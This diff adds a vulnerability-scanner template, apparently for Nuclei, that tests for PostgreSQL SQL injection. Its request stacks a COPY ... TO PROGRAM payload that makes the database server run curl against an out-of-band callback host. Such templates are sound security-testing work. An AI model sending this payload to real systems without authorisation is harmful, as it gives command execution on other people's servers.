@@ -1,0 +1,18 @@
+id: sqli-oob-postgresql-copy
+
+info:
+  name: PostgreSQL SQLi OOB via COPY to remote file
+  severity: critical
+  author: reewardius
+  tags: sqli,oob,postgresql
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1; COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}'--"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
